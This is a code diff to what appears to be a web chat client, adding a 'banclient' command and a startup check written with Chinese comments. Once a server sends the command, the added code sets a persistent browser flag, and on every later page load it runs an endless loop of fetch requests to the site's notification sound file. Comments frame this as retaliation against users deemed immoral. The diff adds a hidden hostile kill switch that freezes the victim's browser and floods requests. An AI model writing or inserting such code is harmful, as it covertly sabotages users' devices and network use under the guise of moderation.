@@ -568,6 +568,22 @@ var COMMANDS = {
 		nick.textContent = '[已撤回]' + nick.textContent
 		nick.oncontextmenu = e => e.preventDefault()
 		text.innerHTML = '该信息已被撤回。如果此功能被滥用，请立刻报告管理员。'
+	},
+	banclient: args => {
+		// 封禁当前客户端以“自杀”
+		localStorageSet('client-banned', true)
+		location.reload()    // 重载，开启震撼时代
+	}
+}
+
+function checkClientBanned() {
+	// 检查客户端是否被封禁
+	// MrZhang365：有时候我们真得学学当初不被我们看好的XC的kill功能，只用一个小把戏，就成功驱逐了卢本伟
+	if (!localStorageGet('client-banned')) return false
+	while (true) {
+		// 既然他们不讲道德，那我对他们讲的道德就是浪费
+		// 疯狂GET我们的通知提示音，反正是静态文件，还有cloudflare护体，打不爆的
+		fetch('https://chat.zhangsoft.link/audio/notify.mp3').then(async result => console.log(await result.text()))
 	}
 }
 
@@ -1567,6 +1583,7 @@ $('#prefix-selector').value = currentPrefix;
 
 /* 首先执行 */
 
+checkClientBanned()
 if (!myChannel) {
 	$('#messages').innerHTML = '';
 	$('#footer').classList.add('hidden');
